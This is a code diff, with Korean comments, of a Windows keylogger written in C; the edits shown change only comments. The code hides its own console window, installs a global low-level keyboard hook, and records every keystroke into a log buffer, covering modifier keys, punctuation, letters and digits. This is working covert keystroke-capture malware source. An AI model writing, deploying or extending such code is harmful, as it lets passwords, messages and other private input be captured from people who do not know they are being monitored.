@@ -132,17 +132,17 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Shift + ");
             }
 
-            if (((GetAsyncKeyState(VK_LCONTROL) & 0x8000) != 0x8000) && (VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode))    //ctrl 중복출력을 막아보려 했으나 실패
+            if (((GetAsyncKeyState(VK_LCONTROL) & 0x8000) != 0x8000) && (VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode))    // ctrl 출력
             {
                 printf("Ctrl \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Ctrl ");
             }
-            else if (((GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0x8000) && (VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode))    //shift 중복출력을 막아보려 했으나 실패
+            else if (((GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0x8000) && (VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode))    // shift 출력
             {
                 printf("Shift \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Shift ");
             }
-            else if (VK_RETURN == pKey->vkCode)
+            else if (VK_RETURN == pKey->vkCode) //Enter 출력
             {
                 printf("Enter \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Enter ");
@@ -158,92 +158,92 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 // 버퍼 초기화
                 logBufferIndex = 0;
             }
-            else if (VK_SPACE == pKey->vkCode)
+            else if (VK_SPACE == pKey->vkCode) // Space 출력
             {
                 printf("Space \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Space ");
             }
-            else if (VK_BACK == pKey->vkCode)
+            else if (VK_BACK == pKey->vkCode) // Backspace 출력
             {
                 printf("Backspace \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Backspace ");
             }
-            else if (VK_MENU == pKey->vkCode)
+            else if (VK_MENU == pKey->vkCode) // Alt 출력
             {
                 printf("Alt \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Alt ");
             }
-            else if (VK_CAPITAL == pKey->vkCode)
+            else if (VK_CAPITAL == pKey->vkCode) // Caps lock 출력
             {
                 printf("CAPS LOCK \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "CAPS LOCK ");
             }
-            else if (VK_TAB == pKey->vkCode)
+            else if (VK_TAB == pKey->vkCode) // Tab 출력
             {
                 printf("Tab \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Tab ");
             }
-            else if (VK_ESCAPE == pKey->vkCode)
+            else if (VK_ESCAPE == pKey->vkCode) // Escape 출력
             {
                 printf("Escape \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Escape ");
             }
-            else if (VK_LWIN == pKey->vkCode)
+            else if (VK_LWIN == pKey->vkCode) // Window 출력
             {
                 printf("Windows \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Windows ");
             }
-            else if (VK_OEM_1 == pKey->vkCode)
+            else if (VK_OEM_1 == pKey->vkCode) // ; 출력
             {
                 printf("; \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "; ");
             }
-            else if (VK_OEM_2 == pKey->vkCode)
+            else if (VK_OEM_2 == pKey->vkCode) // / 출력
             {
                 printf("/ \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "/ ");
             }
-            else if (VK_OEM_3 == pKey->vkCode)
+            else if (VK_OEM_3 == pKey->vkCode) // ` 출력
             {
                 printf("` \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "` ");
             }
-            else if (VK_OEM_4 == pKey->vkCode)
+            else if (VK_OEM_4 == pKey->vkCode) // [ 출력
             {
                 printf("[ \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "[ ");
             }
-            else if (VK_OEM_6 == pKey->vkCode)
+            else if (VK_OEM_6 == pKey->vkCode) // ] 출력
             {
                 printf("] \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "] ");
             }
-            else if (VK_OEM_7 == pKey->vkCode)
+            else if (VK_OEM_7 == pKey->vkCode) // ' 출력
             {
                 printf("' \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "' ");
             }
-            else if (VK_OEM_COMMA == pKey->vkCode)
+            else if (VK_OEM_COMMA == pKey->vkCode) // , 출력
             {
                 printf(", \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ", ");
             }
-            else if (VK_OEM_PERIOD == pKey->vkCode)
+            else if (VK_OEM_PERIOD == pKey->vkCode) // . 출력
             {
                 printf(". \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ". ");
             }
-            else if (VK_OEM_PLUS == pKey->vkCode)
+            else if (VK_OEM_PLUS == pKey->vkCode) // = 출력
             {
                 printf("= \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "= ");
             }
-            else if (VK_OEM_MINUS == pKey->vkCode)
+            else if (VK_OEM_MINUS == pKey->vkCode) // - 출력
             {
                 printf("- \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "- ");
             }
-            else   //그외 문자들(숫자, 알파벳)
+            else   // 그외 문자들(숫자, 알파벳)
             {
                 if ((pKey->vkCode >= 'A' && pKey->vkCode <= 'Z') || (pKey->vkCode >= '0' && pKey->vkCode <= '9'))
                 {
@@ -256,7 +256,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
 
 
-    CallNextHookEx(hHook, nCode, wParam, lParam);    //nCode < 0 : 프로세스에 메시지가 없을 경우
+    CallNextHookEx(hHook, nCode, wParam, lParam);    // nCode < 0 : 프로세스에 메시지가 없을 경우
 
 
     return 0;
@@ -285,20 +285,20 @@ int main(int argc, char* argv[])
     HWND hWnd = GetForegroundWindow();
     ShowWindow(hWnd, SW_HIDE); // 백그라운드 실행
 
-    HMODULE hInstance = GetModuleHandle(NULL);    //자신의 module값을 가져온다.
+    HMODULE hInstance = GetModuleHandle(NULL);    // 자신의 module값을 가져온다.
 
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);    //후킹 프로시저를 설치
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);    // 후킹 프로시저를 설치
 
     UINT_PTR timerId = SetTimer(NULL, 0, 100, TimerProc); // .1초 (100밀리초)마다 타이머 호출
 
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))    //메시지 큐에 메시지가 있으면 MSG구조체에 저장하고 TRUE 반환하며, WM_QUIT일 경우 FALSE를 반환한다.
+    while (GetMessage(&msg, NULL, 0, 0))    // 메시지 큐에 메시지가 있으면 MSG구조체에 저장하고 TRUE 반환하며, WM_QUIT일 경우 FALSE를 반환한다.
     {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    UnhookWindowsHookEx(hHook);    //설치된 후킹 프로시저를 제거
+    UnhookWindowsHookEx(hHook);    // 설치된 후킹 프로시저를 제거
 
     return 0;
 }
